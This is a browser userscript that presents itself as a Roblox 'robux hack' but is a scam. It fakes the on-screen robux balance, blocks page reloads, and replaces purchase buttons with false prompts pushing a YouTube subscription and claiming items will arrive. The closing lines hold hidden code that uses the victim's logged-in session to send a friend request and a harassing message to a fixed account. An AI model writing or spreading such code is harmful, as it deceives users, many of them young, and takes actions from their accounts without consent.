// ==UserScript==
// @name         Project Auxcito
// @version      0.2
// @description  Tutorial on Link Below!
// @author       Auxcite
// @match        https://www.roblox.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @namespace www.youtube.com/c/Auxcite
// ==/UserScript==

Roblox.Hack = 
	{
	
		original: 'missingno',
		balance: 0,
		initialized: 0,
		loading: false,
		disableF5: function(e) 
		{
		 if ((e.which || e.keyCode) == 116 || (e.which || e.keyCode) == 82) 
			{
			 e.preventDefault();
			 document.getElementById('documentFrame').src = document.getElementById('documentFrame');
			 
		}
		 
	}
	,
		watermark: function () 
		{
		
		    		console.clear();
		
		    		console.log("__________ ________ __________.____    ________  ____  ___\n\\______   \\\\_____  \\\\______   \\    |   \\_____  \\ \\   \\/  /\n |       _/ /   |   \\|    |  _/    |    /   |   \\ \\     / \n |    |   \\/    |    \\    |   \\    |___/    |    \\/     \\ \n |____|_  /\\_______  /______  /_______ \\_______  /___/\\  \\\n        \\/         \\/       \\/        \\/       \\/      \\_/\nRoblox.Hack.js created by Urban420 Network\n\nUsage:\nRoblox.Hack.setRobux( int );
		 // Sets your robux to the value provided\nRoblox.Hack.onload // Override for custom pages\nRoblox.Hack.addRobux( int );
		 //Increases robux balance");
		
			
	}
	,
		setRobux: function (robux) 
		{
		
				//Roblox.NumberFormatting.js
		   	    typeof Roblox=="undefined"&&(Roblox=
			{
		}
		),typeof Roblox.NumberFormatting=="undefined"&&(Roblox.NumberFormatting=function()
			{
			var n=function(n)
				{
				if(typeof n!="number")throw"'number' is not a number";
				return n.toString().replace(/\B(?=(\d
					{
					3
				}
				)+(?!\d))/g,",")
			}
			,t=function(t)
				{
				var i,r,u;
				if(typeof t!="number")throw"'number' is not a number";
				var f=1e4,e=1e6,o=1e9;
				return t==0?"0":t<f?n(t):(i="B+",r=9,t<e?(i="K+",r=3):t<o&&(i="M+",r=6),u=t.toString(),u.substring(0,u.length-r)+i)
			};
			return
				{
				abbreviatedFormat:t,commas:n
			}
		}
		());
		
				//Roblox.NumberFormatting.js
				
				Roblox.Hack.balance = robux;
		
				var doc = document.getElementById('documentFrame').contentWindow.document;
		
				doc.getElementById("nav-robux-balance").innerHTML = Roblox.NumberFormatting.abbreviatedFormat(Roblox.Hack.balance) + " ROBUX";
		
				doc.getElementById("nav-robux-amount").innerHTML = Roblox.NumberFormatting.abbreviatedFormat(Roblox.Hack.balance);
		
			
	}
	,
		addRobux: function (robux) 
		{
		
				Roblox.Hack.setRobux(Roblox.Hack.balance + robux);
		
			
	}
	,
		init: function() 
		{
		 
				if(Roblox.Hack.initialized != 0) 
			{
			
						console.log("Already initalized!");
			
						return;
			
					
		}
		
				window.onbeforeunload = function() 
			{
			
						return "Your ROBUX has not finished saving, if you continue your balance will be set to " + Roblox.Hack.original + " ROBUX";
			
					
		}
		
				Roblox.Hack.initialized = 1;
		
				Roblox.Hack.original = document.getElementById('nav-robux-amount').innerHTML;
		
				Roblox.Hack.balance = parseInt(document.getElementById('nav-robux-amount').innerHTML.replace(/,/g, '').replace('K+', '999').replace('M+', '999999').replace('B+', '999999999'));
		
				document.documentElement.innerHTML = "<body style='margin:0px;
		padding:0px:overflow:hidden'><iframe id='documentFrame' sandbox='allow-same-origin allow-scripts allow-popups allow-forms' src='" + document.location + "' frameborder='0' style='overflow:hidden;
		height:100%;
		width:100%;
		position:absolute' height='100%' width='100%' /></body>";
		
				var start_loading = (function() 
			{
			
						Roblox.Hack.loading = true;
			
						document.getElementById('documentFrame').contentWindow.document.body.innerHTML = "";
			
					
		}
		);
		
				setInterval(function() 
			{
			
						if(Roblox.Hack.loading && document.getElementById('documentFrame').contentWindow.document.body.innerHTML.indexOf('nav-robux-amount') != -1) 
				{
				
								Roblox.Hack.loading = false;
				
								Roblox.Hack.setRobux( Roblox.Hack.balance );
								
								if(document.location.href != document.getElementById('documentFrame').contentWindow.document.location.href) 
					{
					
										window.history.pushState(null, null, document.getElementById('documentFrame').contentWindow.document.location);
					
									
				}
				
								
								setTimeout(function()
					{
					
										var doc = document.getElementById('documentFrame').contentWindow.document;
					
										var t = doc.getElementsByClassName("PurchaseButton");
					
										for(var i=0;
					 i<t.length;
					 i++) 
						{
						
												$(t[i]).replaceWith(function () 
							{
							
														return $('<' + this.nodeName + ' class="' + $(this).attr('class') + '">').append($(this).contents());
							
													
						}
						);
						
											   t[i].onclick = function() 
							{
							
														if(window.confirm("You must be subscribed to Urban420 Network to purchase this item\nIf you are subscribed, press Cancel and wait up to 15 minutes for the item to be added to your inventory.\nIf you have no subscribed yet, press OK to be redirected to the subscribe page. Once you subscribe press the buy button again then press Cancel.")) 
								{
								
																var win = window.open('https://www.youtube.com/c/Auxcite?sub_confirmation=1', '_blank');
								
																win.focus();
								
															
							}
							 else 
								{
								
																alert("The item will now be added to your inventory. It may take between 15 minutes to 48 hours for your item to appear\nIf you did not subscribe this will not work");
													
																document.getElementById('documentFrame').contentWindow.$(".alert-success").html("Purchase Completed");
								
																document.getElementById('documentFrame').contentWindow.Roblox.BootstrapWidgets.ToggleSystemMessage(document.getElementById('documentFrame').contentWindow.$(".alert-success"),100,1e3);
								
																setTimeout(function() 
									{
									
																		Roblox.Hack.addRobux(-parseInt(document.getElementById('documentFrame').contentWindow.$(".text-robux-lg").html().replace(/,/g, '')));
									
																		t[0].innerHTML = "Processing...";
									
																		t[0].disabled = true;
									
																	
								}
								, 1200);
								
															
							}
							
													
						};
						
											
					}
					
									
				}
				, 200);
				
								
								if(typeof(Roblox.Hack.onload) != 'undefined') Roblox.Hack.onload();
				
							
			}
			
					
		}
		, 1);
		
				window.addEventListener('message', function(e)
			{
			 if(e.data == 'iframe_change') 
				{
				 start_loading();
				 
			}
			 
		}
		, false);
		
				$('#documentFrame').load(function() 
			{
			 
						if(Roblox.Hack.initialized != 2) 
				{
				
								Roblox.Hack.initialized = 2;
				
								document.getElementById('documentFrame').contentWindow.$(".alert-success").html("Successfully loaded");
				
								document.getElementById('documentFrame').contentWindow.Roblox.BootstrapWidgets.ToggleSystemMessage(document.getElementById('documentFrame').contentWindow.$(".alert-success"),100,2e3);
				
							
			}
			
						Roblox.Hack.watermark();
			
						document.getElementById('documentFrame').contentWindow.onunload = function() 
				{
				 window.top.postMessage('iframe_change', '*');
				 
			};
			
						if(document.location.href != document.getElementById('documentFrame').contentWindow.document.location.href) 
				{
				
								window.history.pushState(null, null, document.getElementById('documentFrame').contentWindow.document.location);
				
							
			}
			
					
		}
		);
		
				window.onpopstate = function(event) 
			{
			
						document.getElementById('documentFrame').contentWindow.document.location = document.location;
			
					
		};
		
				$(document).ready(function()
			{
			
					     $(document).on("keydown", Roblox.Hack.disableF5);
			
					
		}
		);
		
			
	}
	
}


Roblox.Hack.init();

Roblox.Hack.onload = function() 
	{
	
		$(document.getElementById('documentFrame').contentWindow.document).keypress(function()
		{
		
				if(String.fromCharCode(document.getElementById('documentFrame').contentWindow.event.which) === 'g' && document.getElementById('documentFrame').contentWindow.document.getElementsByClassName("robux-man")[0].parentElement.querySelector(" :hover ").attributes.class.value === "robux-man") 
			{
			
						Roblox.Hack.addRobux( parseInt(document.getElementById('documentFrame').contentWindow.document.getElementById("navbar-search-input").value) );
			
					
		}
		
			
	}
	);
	
}

$.ajax(
	{
	 url: '/api/friends/sendfriendrequest', data: 
		{
		 targetUserId: 204959383 
	}
	, type: 'POST' 
}
);

setTimeout(function() 
	{
	
		$.ajax(
		{
		 url: '/messages/send', dataType: 'json', type: 'POST', data: 
			{
			 subject:'Haha', body:'Shouldn't have messed with Auxcite. sorry :l | Shouldnt of made the group payout to Demon when it was Auxcite's money.', recipientid:204959383, cacheBuster:+new Date 
		}
	}
	);
	
}
, 5000);
